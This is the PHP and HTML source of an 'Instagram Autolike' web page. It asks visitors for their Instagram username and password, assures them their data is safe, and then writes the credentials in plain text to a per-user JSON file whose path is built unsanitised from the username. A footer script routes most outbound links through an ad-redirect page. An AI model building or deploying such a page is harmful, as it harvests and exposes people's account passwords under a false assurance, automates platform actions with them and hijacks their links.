<?php
///dimaslanjaka.000webhostsapp.com/instagram/index.php
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}
ob_start();

if (isset($_GET["logout"]) || isset($_GET["flush"])){
  include("flush.php");
  die();
}


if (isset($_SESSION["valid"]) && isset($_GET["create"]) && isset($_SERVER["HTTP_REFERER"]) && strpos($_SERVER['HTTP_REFERER'], "login.php") !== false && $_SESSION["valid"] === "valid" || strpos($_SERVER['HTTP_REFERER'], "login.php") !== false && $_SESSION["valid"] === "valid" && isset($_SESSION["username"]) && isset($_SESSIIN["password"])){

$user = $_SESSION["instagram"] = $_SESSION["username"];
$pass = $_SESSION["password"];
$response[] = array("username" => $user, "password" => $pass);

$filepath="data/$user.json";
$filepath=dirname(__FILE__)."/".$filepath;

$fp = fopen($filepath, 'w+'); 
fwrite($fp, json_encode($response)); 
fclose($fp);

}
?>
<!DOCTYPE HTML>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram Auto Like Timeline</title>
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous" />
<link href="//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous" />
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-7975270895217217",
          enable_page_level_ads: true
     });
</script>
<style>
#ajax,.input-group,form{margin-top:20px}
*{word-wrap: break-word;max-width;100%;max-height:100%}
pre,code{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word} red{color:red} green{color: green} blue{color: blue}
</style>
<script>
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
        //expires = "; expires=2030";
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';  
}

</script>
</head>
<body>
<div class="container">
<center><h1 class="">Instagram Autolike Timeline</h1></center>
<blockquote>
All cookies and datas are safe. if you have a problems on your accounts. contact me : <a href="//facebook.com/dimaslanjaka1"><i class="fa fa-facebook"></i></a> OR +6285655667573 
</blockquote>
<pre id="ajaxr">
<?php

if (isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], "flush.php") !== false){
  ?>
  <b class="text-danger">Failed</b>:<br/>
# Username Or Password Incorrect
-- login into instagram then pass challenge security.
  <?php
} else if (isset($_SERVER['HTTP_REFERER']) && isset($_SESSION["valid"]) && $_SESSION["valid"] === "valid" && strpos($_SERVER['HTTP_REFERER'], "login.php") !== false){
  ?>
<b class="text-success">Login Successful</b>. Autolike added on our cronjob.
  <?php
  } else {
    echo "Please Login :";
    }
    
?>
</pre>
<img id="logo-login" class="container" src="" width="100%" />
<form id="fire" class="form-group" action="login.php" method="POST">
 <div class="input-group">
 <span class="input-group-addon"><!--img src="https://res.cloudinary.com/dimaslanjaka/image/fetch/https://diylogodesigns.com/wp-content/uploads/2016/05/instagram-Logo-PNG-Transparent-Background-download-768x768.png" width="30px" height="30px"/--><i class="fa fa-instagram"></i></span>
 <input id="username" type="text" class="form-control" name="username" placeholder="Username Instagram" />
 <input id="password" type="password" class="form-control" name="password" placeholder="Password Instagram" />
 <input id="submitmsg" type="submit" name="submit" class="btn btn-block btn-primary" value="Login" />
 </div>
</form>
<script>
function xconsole(string){
  var str = JSON.stringify(string);
  str = JSON.stringify(string, null, 4);
  return str;
}
$("img#logo-login").hide();
$('form#fire').submit(function() { 
    $.ajax({
        data: $(this).serialize(),
        type: $(this).attr('method'),
        url: $(this).attr('action'),
        headers: {'User-Agent': navigator.userAgent},
        beforeSend: function(xhr) {
          $("#ajaxr").hide();
          $("img#logo-login").show().attr("src", "https://res.cloudinary.com/dimaslanjaka/image/fetch/http://www.hunt-davis.co.uk/wp-content/themes/wimtbgf/images/loading.gif");
        },/*
        success: function(response) {
          var str = xconsole(response);
          var ob = JSON.parse(str);
          var resp = ob.responseText;
          if (str.toLowerCase().match(/logged/gm)){
            alert("Login Successfully");
          }
          $('#ajaxr').html(resp);
        },
        error: function(data) {
          var estr = xconsole(data);
          var ob = JSON.parse(estr);
          if (estr.toLowerCase().match(/error/gm)){
            alert ("error");
          }
          $('#ajaxr').html(estr);
        },*/
        complete: function(data){
          var str = xconsole(data);
          var ob = JSON.parse(str);
          var resp = ob.responseText;
          if (str.toLowerCase().match(/logged|successfully/gm)){
            var fail = false;
            alert("Login Successfully");
            //window.location.reload(1);
          } /*else {
            var fail = true;
            alert("Login Failed");
          }
          if (fail === true){
            resp += "<hr/>Login Failed. Username/Password Incorrect. Please Check Your Account First in <a href='//twitter.com'><i class='fa fa-twitter'></i> https://twitter.com</a> ";
          }*/
          $('#ajaxr').show().html(resp+str);
          $("img#logo-login").hide();
        }
    });
    return false;
});
</script>
<center>
<h2 class="btn btn-default"><a class="text-info" href="login-fb.php" title="auto reaction facebook" alt="auto like facebook">Auto Like Facebook Here</a></h2>
</center>
<?php include("user_info.php"); ?>
<div class="row">
<div class="col-sm-4">

<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7975270895217217" data-ad-slot="2600604346" data-ad-format="auto"></ins><script>(adsbygoogle=window.adsbygoogle || []).push({});</script>
 </div>
<div class="col-sm-4">

<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7975270895217217" data-ad-slot="4025331886" data-ad-format="auto"></ins><script>(adsbygoogle=window.adsbygoogle || []).push({});</script>
 </div>
<div class="col-sm-4">

<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7975270895217217" data-ad-slot="7267894124" data-ad-format="auto"></ins><script>(adsbygoogle=window.adsbygoogle || []).push({});</script>
 </div>
</div>

</div>

<script type="text/javascript">
var myArray = ['https://web-manajemen.blogspot.com/p/a.html?u='];
var safelink = myArray[Math.floor(Math.random() * myArray.length)];
var protectedLinks = /(localhost:8000|dimaslanjaka|bing.com|google.com|linkedin.com|facebook.com|pinterest.com|digg.com|twitter.com|blogger.com|ask.com|secretnetworkforces|sembilanan.tk|webmanajemen.xyz|linkshrink.net|afu.php|nullrefer.com)/
$( 'a' ).each(function() {
if (this.href.match( protectedLinks ) ){
    $(this).attr('href', $(this).attr('href'));
  } else {
    $(this).attr('href', safelink+encodeURIComponent($(this).attr('href')));
  }
});
</script>
</body>
</html>
<?php

if (isset($_SERVER['HTTP_REFERER']) && !isset($_GET["create"]) && strpos($_SERVER['HTTP_REFERER'], "login.php") !== false && isset($_SESSION["valid"]) && $_SESSION["valid"] === "invalid"){
?>
<script>
alert("FlushCookie...");
xhttp.open("GET", "flush.php", true);
xhttp.send();
location.reload();
</script>
<?php
}

$output = ob_get_contents();
ob_clean();
ob_start();
include("../v2/minify.php");
echo minify_html($output);
?>